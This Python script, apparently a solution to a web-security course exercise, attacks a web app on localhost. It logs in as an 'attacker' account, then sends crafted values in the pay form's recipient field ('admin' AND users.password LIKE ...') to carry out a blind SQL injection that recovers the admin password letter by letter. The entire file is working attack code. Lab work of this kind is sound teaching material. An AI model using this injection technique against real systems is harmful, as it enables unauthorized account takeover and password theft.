from urllib import request
from requests import codes, Session

LOGIN_FORM_URL = "http://localhost:8080/login"
PAY_FORM_URL = "http://localhost:8080/pay"

def submit_login_form(sess, username, password):
    response = sess.post(LOGIN_FORM_URL,
                         data={
                             "username": username,
                             "password": password,
                             "login": "Login",
                         })
    return response.status_code == codes.ok

def submit_pay_form(sess, recipient, amount):
    # You may need to include CSRF token from Exercise 1.5 in the POST request below 
    response = sess.post(PAY_FORM_URL,
                    data={
                        "recipient": recipient,
                        "amount": amount,
                        "CSRFToken": sess.cookies.get_dict()['session'],
                    })
    return response.status_code == codes.ok

def sqli_attack(username):
    sess = Session()
    brute_str = ""
    alpha = "abcdefghijklmnopqrstuvwxyz"
    run = True
    password = ""
    last_pass = ""
    assert(submit_login_form(sess, "attacker", "attacker"))
    while run:
        if password != "":
            if last_pass == password:
                run = False
        for letter in alpha:
            brute_str += letter +"%"

            if submit_pay_form(sess,"{}' AND users.password LIKE '{}".format(username,brute_str),0):
                password += letter
                brute_str = password
                
                break
            last_pass = password
            brute_str = password
    return password
  

def main():
    sqli_attack("admin")

if __name__ == "__main__":
    main()
